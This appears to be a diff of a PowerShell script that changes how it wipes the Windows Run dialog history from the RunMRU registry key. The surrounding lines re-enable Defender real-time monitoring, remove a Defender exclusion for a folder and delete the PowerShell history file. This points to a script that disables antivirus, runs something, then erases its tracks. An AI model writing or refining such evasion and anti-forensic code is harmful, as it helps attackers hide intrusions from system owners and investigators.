@@ -128,8 +128,22 @@ Set-MpPreference -DisableRealtimeMonitoring $false
 Remove-MpPreference -ExclusionPath $dir
 
 # Clear Windows Run history
-Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force
-New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force
+# Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force
+# New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force
+
+# Clear all values in the RunMRU registry key
+$runMruPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+
+# Get all entries in the RunMRU key except the default one
+$runMruEntries = Get-ItemProperty -Path $runMruPath | Select-Object -Property * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSDrive, PSProvider, '(default)'
+
+# Loop through and remove each entry
+foreach ($entry in $runMruEntries.PSObject.Properties.Name) {
+    Remove-ItemProperty -Path $runMruPath -Name $entry -Force
+}
+
+# Optionally, recreate the default key if necessary
+New-ItemProperty -Path $runMruPath -Name "(default)" -Value $null -Force
 
 # Clear PowerShell history
 Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force
